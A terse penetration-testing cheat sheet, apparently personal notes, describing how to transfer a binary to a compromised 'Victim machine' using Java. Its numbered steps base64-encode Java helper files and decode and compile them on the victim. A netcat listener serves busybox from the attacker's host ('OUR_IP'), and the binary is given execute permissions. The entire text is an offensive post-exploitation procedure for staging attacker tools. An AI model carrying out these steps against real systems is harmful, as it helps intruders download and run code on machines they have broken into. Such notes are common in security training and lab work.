## File transfer with java

#### 1) base64 SocketClient.java

#### 2) echo "BASE64ENCODED" | base64 -d > SocketClient.java (Victim machine)

#### 3) javac SocketClient.java 

#### 4) base64 FilePermissions.java

#### 5)  echo "BASE64ENCODED" | base64 -d > FilePermissions.java (Victim machine)

#### 6) javac FilePermissions.java

#### 7) nc -lvnp 5555 < busybox

#### 8) java SocketClient OUR_IP 5555 > busybox (Victim machine)

#### 9) java FilePermissions (Give busybox permissions to execute)
